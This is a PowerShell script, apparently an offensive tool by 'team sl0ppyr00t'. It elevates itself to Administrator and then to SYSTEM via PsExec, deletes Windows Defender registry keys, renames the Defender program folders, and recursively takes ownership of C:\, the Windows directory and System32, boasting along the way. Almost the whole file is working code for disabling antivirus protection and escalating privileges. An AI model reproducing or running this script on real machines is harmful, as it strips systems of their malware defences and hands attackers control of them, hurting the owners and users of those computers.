<#
.SYNOPSIS
Author: P.Hoogeveem
Alias: x0xr00t
Build: -
Name: Sl0ppy-ntc

Description:
This script checks if the current user is NT AUTHORITY\SYSTEM and performs various actions accordingly, such as elevating privileges, removing Windows Defender registry keys, renaming Windows Defender folders, and taking ownership of certain directories.

Usage:
Run this script in a PowerShell environment.

Disclaimer:
Use this script responsibly and be cautious when modifying system settings and registry keys.

#>

write-host ""
write-host ""
write-host " { sl0p [0] Checking If We Got NT_Authority\system}"
write-host ""
write-host ""
if (-Not $($(whoami) -eq "nt authority\system")) {
    $IsSystem = $false

    # Elevate to admin (needed when called after reboot)
    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        Write-Host "Elevating to Administrator..."
        $CommandLine = "-ExecutionPolicy Bypass `"&'$MyInvocation.MyCommand.Path'" $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }

    # Elevate to SYSTEM if psexec is available 
    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
    if ($psexec_path) {
        Write-Host "Elevating to SYSTEM..."
        $CommandLine = "-i -s powershell.exe -ExecutionPolicy Bypass `"&'$MyInvocation.MyCommand.Path'" $MyInvocation.UnboundArguments 
        Start-Process -FilePath $psexec_path -ArgumentList $CommandLine
        exit
    } else {
        Write-Host "PsExec not found, continuing as Administrator..."
    }
} else {
    $IsSystem = $true
    Write-Host "Running as NT AUTHORITY\SYSTEM..."
    Write-Host "Evil Laughs, we are NT AUTHORITY\SYSTEM!"
}

# Output a message
Write-Host "Proudly presented by team sl0ppyr00t"
Write-Host "sl0ppyr00t - because we always take them null levels, spray em with nulls till we nullify ourselves a null access"
Write-Host "We will execute code as NT from here on."

# Remove Windows Defender registry keys
Write-Host "Removing Windows Defender registry keys..."
$defenderKeys = @(
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Miscellaneous",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\MpEngine",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\NIS",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Quarantine",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Remediation",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Reporting",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Scan",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Signature Updates",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Spynet",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Threats",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\UX Configuration",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\WCOS"
)

foreach ($key in $defenderKeys) {
    Remove-Item -Path $key -Force -Verbose
}

# Rename Windows Defender folders
Write-Host "Renaming Windows Defender folders..."
Rename-Item "C:\Program Files\Windows Defender" "C:\Program Files\Windows_fuck" -Force -Verbose
Rename-Item "C:\Program Files (x86)\Windows Defender" "C:\Program Files (x86)\Windows_fuck" -Force -Verbose

# Take ownership of certain directories
Write-Host "Taking ownership of directories..."
$directories = @("C:\", "C:\Windows\", "C:\Windows\System32", "C:\ProgramData\Microsoft\Windows Defender")

foreach ($directory in $directories) {
    Write-Host "Takeown: $directory"
    takeown.exe /F "$directory" /A /R /D N
}

Write-Host "Done."
